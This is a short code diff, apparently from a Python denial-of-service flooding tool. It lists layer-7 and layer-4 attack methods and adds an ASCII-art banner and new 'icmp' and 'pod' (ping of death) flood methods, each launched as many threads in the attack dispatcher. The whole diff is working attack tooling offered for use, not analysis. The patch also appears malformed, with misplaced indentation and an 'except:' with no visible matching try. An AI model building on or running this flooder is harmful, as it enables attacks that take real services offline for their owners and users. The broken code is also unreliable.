@@ -31,6 +31,23 @@ def run():
 ''')
 
 l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "SLOW", "HEAD", "HIT", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB"]
+        print(f'{d1}')
+        print(r'''
+              (
+               )
+              (
+        /\  .-"""-.  /\
+       //\\/  ,,,  \//\\
+       |/\| ,;;;;;, |/\|
+       //\\\;-"""-;///\\
+      //  \/   .   \/  \\
+     (| ,-_| \ | / |_-, |)
+       //`__\.-.-./__`\\
+      // /.-(() ())-.\ \\
+     (\ |)   '---'   (| /)
+      ` (|           |) `
+        \)           (/
+''')
 l4 = ["TCP", "UDP", "MEM"]
 methods = l7 + l4
 methodsl = l7 + l4
@@ -139,6 +156,15 @@ def start_attack(method, threads, event, socks_type):
         elif method == "ntp":
             for _ in range(threads):
                 threading.Thread(target=ntp, args=(event, timer), daemon=True).start()
+
+        # layer3
+        elif method == "icmp":
+            for _ in range(threads):
+                threading.Thread(target=icmp, args=(event, timer), daemon=True).start()
+        elif method == "pod":
+            for _ in range(threads):
+                threading.Thread(target=pod, args=(event, timer), daemon=True).start()
+    except:
         pass
 
 def random_data():
